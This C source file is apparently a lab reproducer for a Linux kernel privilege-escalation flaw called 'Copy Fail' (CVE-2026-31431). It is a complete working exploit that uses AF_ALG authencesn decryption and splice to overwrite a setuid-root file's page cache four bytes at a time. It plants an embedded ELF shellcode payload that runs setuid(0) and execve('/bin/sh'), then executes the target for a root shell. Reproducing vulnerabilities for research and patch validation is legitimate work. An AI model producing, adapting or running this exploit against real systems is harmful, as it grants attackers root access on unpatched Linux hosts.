// SPDX-License-Identifier: MIT
/*
 * Lab-only LPE reproducer for CVE-2026-31431 / Copy Fail.
 *
 * The target is fixed to /copyfail_suid, a disposable setuid-root file that
 * exists only in the generated QEMU initramfs. Each AF_ALG operation mutates
 * four bytes of that file's page cache. The injected minimal x86-64 ELF calls
 * setuid(0) and execve("/bin/sh").
 */
#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_IV
#define ALG_SET_IV 2
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_SET_AEAD_ASSOCLEN
#define ALG_SET_AEAD_ASSOCLEN 4
#endif

#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 5
#endif

#ifndef ALG_OP_DECRYPT
#define ALG_OP_DECRYPT 0
#endif

#define ALG_MAX_SALG_TYPE 14
#define ALG_MAX_SALG_NAME 64

struct sockaddr_alg {
	sa_family_t salg_family;
	uint8_t salg_type[ALG_MAX_SALG_TYPE];
	uint32_t salg_feat;
	uint32_t salg_mask;
	uint8_t salg_name[ALG_MAX_SALG_NAME];
};

struct af_alg_iv {
	uint32_t ivlen;
	uint8_t iv[];
};

#define TARGET_PATH "/copyfail_suid"
#define LAB_UID 1000

static const unsigned char authenc_key[8 + 32] = {
#if __BYTE_ORDER == __LITTLE_ENDIAN
	0x08, 0x00, 0x01, 0x00,
#else
	0x00, 0x08, 0x00, 0x01,
#endif
	0x00, 0x00, 0x00, 0x10,
};

/*
 * Minimal ET_EXEC image based on the public x86-64 exploit. Its entry point:
 *
 *     setuid(0);
 *     execve("/bin/sh", NULL, NULL);
 *     _exit(0);
 */
static const unsigned char payload[] = {
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xa2, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xa2, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x31, 0xff,
	0xb0, 0x69, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x13,
	0x00, 0x00, 0x00, 0x31, 0xf6, 0x56, 0x57, 0x48,
	0x89, 0xe6, 0xb0, 0x3b, 0x99, 0x0f, 0x05, 0x31,
	0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05, 0x2f, 0x62,
	0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00,
};

static void close_if_open(int fd)
{
	if (fd >= 0)
		close(fd);
}

static int patch_chunk(int file_fd, off_t offset,
		       const unsigned char four_bytes[4])
{
	int ctrl_sock = -1;
	int op_sock = -1;
	int pipefd[2] = { -1, -1 };
	int rc = -1;
	unsigned char *sink = NULL;

	ctrl_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (ctrl_sock < 0) {
		perror("socket(AF_ALG)");
		goto out;
	}

	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	memcpy(sa.salg_type, "aead", sizeof("aead"));
	memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
	       sizeof("authencesn(hmac(sha256),cbc(aes))"));

	if (bind(ctrl_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind(authencesn)");
		goto out;
	}
	if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_KEY,
		       authenc_key, sizeof(authenc_key)) < 0) {
		perror("setsockopt(ALG_SET_KEY)");
		goto out;
	}
	if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
		       NULL, 4) < 0) {
		perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)");
		goto out;
	}

	op_sock = accept(ctrl_sock, NULL, 0);
	if (op_sock < 0) {
		perror("accept(AF_ALG)");
		goto out;
	}

	unsigned char aad[8] = {
		'A', 'A', 'A', 'A',
		four_bytes[0], four_bytes[1], four_bytes[2], four_bytes[3],
	};
	struct iovec iov = {
		.iov_base = aad,
		.iov_len = sizeof(aad),
	};
	union {
		struct cmsghdr align;
		unsigned char buf[CMSG_SPACE(sizeof(uint32_t)) +
				  CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
				  CMSG_SPACE(sizeof(uint32_t))];
	} cbuf;
	memset(&cbuf, 0, sizeof(cbuf));

	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf.buf,
		.msg_controllen = sizeof(cbuf.buf),
	};

	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_IV;
	cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
	struct af_alg_iv *iv = (struct af_alg_iv *)CMSG_DATA(cmsg);
	iv->ivlen = 16;
	memset(iv->iv, 0, 16);

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *)CMSG_DATA(cmsg) = 8;

	if (sendmsg(op_sock, &msg, MSG_MORE) < 0) {
		perror("sendmsg(AAD)");
		goto out;
	}
	if (pipe(pipefd) < 0) {
		perror("pipe");
		goto out;
	}

	size_t splice_len = (size_t)offset + 4;
	off_t src_off = 0;
	ssize_t moved = splice(file_fd, &src_off, pipefd[1], NULL,
			       splice_len, 0);
	if (moved != (ssize_t)splice_len) {
		if (moved < 0)
			perror("splice(file -> pipe)");
		else
			fprintf(stderr, "short splice(file -> pipe): %zd/%zu\n",
				moved, splice_len);
		goto out;
	}
	moved = splice(pipefd[0], NULL, op_sock, NULL, splice_len, 0);
	if (moved != (ssize_t)splice_len) {
		if (moved < 0)
			perror("splice(pipe -> AF_ALG)");
		else
			fprintf(stderr, "short splice(pipe -> AF_ALG): %zd/%zu\n",
				moved, splice_len);
		goto out;
	}

	sink = malloc(8 + (size_t)offset);
	if (!sink) {
		perror("malloc(recv sink)");
		goto out;
	}

	/* EBADMSG is expected after authencesn has already made the write. */
	(void)recv(op_sock, sink, 8 + (size_t)offset, 0);
	rc = 0;

out:
	free(sink);
	close_if_open(pipefd[0]);
	close_if_open(pipefd[1]);
	close_if_open(op_sock);
	close_if_open(ctrl_sock);
	return rc;
}

static int verify_target(void)
{
	struct stat st;

	if (stat(TARGET_PATH, &st) < 0) {
		perror("stat(" TARGET_PATH ")");
		return -1;
	}
	printf("[lpe] target owner=%u mode=%04o size=%lld\n",
	       st.st_uid, st.st_mode & 07777, (long long)st.st_size);
	if (st.st_uid != 0 || !(st.st_mode & S_ISUID)) {
		fprintf(stderr, "[lpe] target is not root-owned setuid\n");
		return -1;
	}
	if (st.st_size < (off_t)sizeof(payload)) {
		fprintf(stderr, "[lpe] target is smaller than payload\n");
		return -1;
	}
	return 0;
}

static int drop_to_lab_user(void)
{
	if (getuid() != LAB_UID || geteuid() != LAB_UID ||
	    getgid() != LAB_UID || getegid() != LAB_UID) {
		if (geteuid() != 0) {
			fprintf(stderr,
				"[lpe] expected root or complete uid/gid 1000 credentials\n");
			return -1;
		}
		if (setgroups(0, NULL) < 0 || setgid(LAB_UID) < 0 ||
		    setuid(LAB_UID) < 0) {
			perror("drop privileges");
			return -1;
		}
	}
	printf("[lpe] attacker ruid=%u euid=%u rgid=%u egid=%u\n",
	       getuid(), geteuid(), getgid(), getegid());
	if (getuid() != LAB_UID || geteuid() != LAB_UID ||
	    getgid() != LAB_UID || getegid() != LAB_UID) {
		fprintf(stderr, "[lpe] incomplete privilege drop\n");
		return -1;
	}
	return 0;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	printf("[lpe] launcher ruid=%u euid=%u rgid=%u egid=%u\n",
	       getuid(), geteuid(), getgid(), getegid());
	if (verify_target() < 0 || drop_to_lab_user() < 0)
		return 1;

	int file_fd = open(TARGET_PATH, O_RDONLY);
	if (file_fd < 0) {
		perror("open(" TARGET_PATH ") as uid 1000");
		return 1;
	}

	printf("[lpe] injecting %zu bytes in %zu AF_ALG operations\n",
	       sizeof(payload), sizeof(payload) / 4);
	for (size_t offset = 0; offset < sizeof(payload); offset += 4) {
		if (patch_chunk(file_fd, (off_t)offset, payload + offset) < 0) {
			fprintf(stderr, "[lpe] write failed at offset %zu\n", offset);
			close(file_fd);
			return 1;
		}
	}

	unsigned char observed[sizeof(payload)];
	if (pread(file_fd, observed, sizeof(observed), 0) !=
	    (ssize_t)sizeof(observed)) {
		perror("pread(mutated target)");
		close(file_fd);
		return 1;
	}
	close(file_fd);
	if (memcmp(observed, payload, sizeof(payload)) != 0) {
		fprintf(stderr, "[lpe] page-cache verification failed\n");
		return 1;
	}

	printf("[lpe] page cache matches injected ELF; execing setuid target\n");
	execl(TARGET_PATH, TARGET_PATH, (char *)NULL);
	perror("exec(" TARGET_PATH ")");
	return 1;
}
